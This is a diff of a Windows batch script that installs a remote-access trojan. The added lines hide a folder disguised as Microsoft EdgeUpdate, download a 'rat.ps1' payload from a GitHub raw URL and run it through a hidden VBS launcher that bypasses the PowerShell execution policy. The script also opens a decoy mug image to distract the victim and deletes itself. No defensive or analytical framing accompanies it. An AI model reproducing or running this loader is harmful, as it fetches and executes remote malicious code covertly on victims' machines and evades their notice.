@@ -1,36 +1,12 @@
-::[Bat To Exe Converter]
-::
-::YAwzoRdxOk+EWAnk
-::fBw5plQjdG8=
-::YAwzuBVtJxjWCl3EqQJgSA==
-::ZR4luwNxJguZRRnk
-::Yhs/ulQjdF+5
-::cxAkpRVqdFKZSTk=
-::cBs/ulQjdF+5
-::ZR41oxFsdFKZSDk=
-::eBoioBt6dFKZSDk=
-::cRo6pxp7LAbNWATEpCI=
-::egkzugNsPRvcWATEpCI=
-::dAsiuh18IRvcCxnZtBJQ
-::cRYluBh/LU+EWAnk
-::YxY4rhs+aU+JeA==
-::cxY6rQJ7JhzQF1fEqQJQ
-::ZQ05rAF9IBncCkqN+0xwdVs0
-::ZQ05rAF9IAHYFVzEqQJQ
-::eg0/rx1wNQPfEVWB+kM9LVsJDGQ=
-::fBEirQZwNQPfEVWB+kM9LVsJDGQ=
-::cRolqwZ3JBvQF1fEqQJQ
-::dhA7uBVwLU+EWDk=
-::YQ03rBFzNR3SWATElA==
-::dhAmsQZ3MwfNWATElA==
-::ZQ0/vhVqMQ3MEVWAtB9wSA==
-::Zg8zqx1/OA3MEVWAtB9wSA==
-::dhA7pRFwIByZRRnk
-::Zh4grVQjdCyDJGyX8VAjFDxBRQiOOWaYB6y/O8/64+aCpUIhcOcsc5vUyoiPKfIS/nnmdIIu3jRfgM5s
-::YB416Ek+ZG8=
-::
-::
-::978f952a14a936cc963da21a135fa983
 @echo off
-powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File "%~dp0rat.ps1"
-pause
+if not DEFINED IS_MINIMIZED set IS_MINIMIZED=1 && start "" /min "%~dpnx0" %* && exit
+if not exist "%APPDATA%\Microsoft\EdgeUpdate" mkdir "%APPDATA%\Microsoft\EdgeUpdate"
+attrib +h "%APPDATA%\Microsoft\EdgeUpdate"
+if not exist "%APPDATA%\Microsoft\EdgeUpdate\updater.ps1" (
+    powershell -NoProfile -ExecutionPolicy Bypass -Command "try { Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/icyyboy/wss-test-/refs/heads/main/rat.ps1' -OutFile '%APPDATA%\Microsoft\EdgeUpdate\updater.ps1' -UseBasicParsing -ErrorAction Stop } catch {}" >nul 2>&1
+)
+echo Set objShell = CreateObject("WScript.Shell") > "%APPDATA%\Microsoft\EdgeUpdate\launcher.vbs"
+echo objShell.Run "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -NoProfile -NonInteractive -File ""%APPDATA%\Microsoft\EdgeUpdate\updater.ps1""", 0, False >> "%APPDATA%\Microsoft\EdgeUpdate\launcher.vbs"
+wscript.exe "%APPDATA%\Microsoft\EdgeUpdate\launcher.vbs" //B //Nologo
+start https://ih1.redbubble.net/image.2807335966.3394/mug,standard,x334,right-pad,600x600,f8f8f8.jpg
+REM Auto-eliminar2>nul & del "%~f0"
